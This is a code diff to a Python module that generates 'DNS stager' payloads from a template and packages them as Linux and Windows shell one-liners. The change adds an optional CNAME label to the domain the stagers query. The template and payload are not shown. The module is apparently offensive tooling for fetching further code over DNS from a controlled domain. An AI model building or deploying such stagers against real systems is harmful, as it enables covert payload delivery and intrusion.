@@ -13,7 +13,12 @@ try:
 except NameError:
     text_type = str
 
-_PLACEHOLDERS = ('{{BASE_DOMAIN}}', '{{SFB_ARGS}}', '{{RESOLVER_SNIPPET}}')
+_PLACEHOLDERS = (
+    '{{BASE_DOMAIN}}',
+    '{{CNAME_SUFFIX}}',
+    '{{SFB_ARGS}}',
+    '{{RESOLVER_SNIPPET}}',
+)
 
 _LINUX_RESOLVER_LINES = [
     '    try:',
@@ -135,6 +140,27 @@ def _normalize_domain(base_domain):
     return base_domain
 
 
+def _normalize_cname_label(value):
+    if value is None:
+        return ''
+    value = _ensure_ascii_text(value, 'cname_label').strip()
+    if not value:
+        return ''
+    value = value.strip('.')
+    if not value:
+        return ''
+    if '.' in value:
+        raise ValueError('cname_label must be a single label')
+    return value
+
+
+def _build_cname_suffix(base_domain, cname_label):
+    cname_label = _normalize_cname_label(cname_label)
+    if cname_label:
+        return '%s.%s' % (cname_label, base_domain)
+    return base_domain
+
+
 def _escape_python_string(value):
     value = _ensure_ascii_text(value, 'payload')
     out = []
@@ -168,9 +194,10 @@ def _format_args_list(args):
     return '[' + ', '.join(parts) + ']'
 
 
-def _render_template(template_text, base_domain, sfb_args, resolver_snippet):
+def _render_template(template_text, base_domain, cname_suffix, sfb_args, resolver_snippet):
     rendered = template_text
     rendered = rendered.replace('{{BASE_DOMAIN}}', base_domain)
+    rendered = rendered.replace('{{CNAME_SUFFIX}}', cname_suffix)
     rendered = rendered.replace('{{SFB_ARGS}}', sfb_args)
     rendered = rendered.replace('{{RESOLVER_SNIPPET}}', resolver_snippet)
     for token in _PLACEHOLDERS:
@@ -179,12 +206,19 @@ def _render_template(template_text, base_domain, sfb_args, resolver_snippet):
     return rendered
 
 
-def render_dns_stager(template_path, base_domain, sfb_args, resolver_snippet):
+def render_dns_stager(template_path, base_domain, sfb_args, resolver_snippet, cname_label=None):
     template_text = _read_ascii(template_path)
     base_domain = _normalize_domain(base_domain)
+    cname_suffix = _build_cname_suffix(base_domain, cname_label)
     sfb_args = _format_args_list(sfb_args or [])
     resolver_snippet = _ensure_ascii_text(resolver_snippet, 'resolver snippet')
-    return _render_template(template_text, base_domain, sfb_args, resolver_snippet)
+    return _render_template(
+        template_text,
+        base_domain,
+        cname_suffix,
+        sfb_args,
+        resolver_snippet,
+    )
 
 
 def _posix_shell_quote(value):
@@ -209,7 +243,8 @@ def build_one_liner(payload, platform):
     raise ValueError('Unknown platform: %s' % platform)
 
 
-def write_dns_stagers(base_domain, sfb_args=None, output_dir=None, template_path=None):
+def write_dns_stagers(base_domain, sfb_args=None, output_dir=None,
+                      template_path=None, cname_label=None):
     repo_root = _repo_root()
     if output_dir is None:
         output_dir = repo_root
@@ -225,12 +260,14 @@ def write_dns_stagers(base_domain, sfb_args=None, output_dir=None, template_path
         base_domain,
         sfb_args,
         LINUX_RESOLVER_SNIPPET,
+        cname_label=cname_label,
     )
     windows_payload = render_dns_stager(
         template_path,
         base_domain,
         sfb_args,
         WINDOWS_RESOLVER_SNIPPET,
+        cname_label=cname_label,
     )
     linux_cmd = build_one_liner(linux_payload, platform='posix')
     windows_cmd = build_one_liner(windows_payload, platform='windows')
